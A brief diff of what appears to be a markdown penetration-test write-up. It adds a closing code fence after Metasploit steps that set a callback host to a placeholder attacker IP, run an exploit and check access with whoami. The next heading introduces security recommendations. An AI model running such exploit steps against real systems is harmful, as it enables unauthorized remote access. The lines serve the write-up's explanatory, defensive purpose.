@@ -47,6 +47,8 @@ set LHOST <Attacker_IP>
 exploit
 whoami  # Confirms access
 
+```
+
 ## 🔐 Security Recommendations
 To mitigate these vulnerabilities, the following security measures should be implemented:
 
